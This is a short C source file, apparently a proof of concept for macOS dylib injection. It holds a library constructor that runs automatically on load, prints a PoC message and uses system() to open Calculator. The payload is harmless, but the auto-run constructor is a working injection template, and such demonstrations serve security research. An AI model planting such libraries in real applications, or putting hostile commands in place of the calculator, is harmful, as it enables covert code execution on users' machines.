//gcc -dynamiclib malicious.m -o malicious.dylib
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor)) static void malicious() {
    printf("[PoC] Malicious code executed\n");
    system("open -a Calculator.app");
}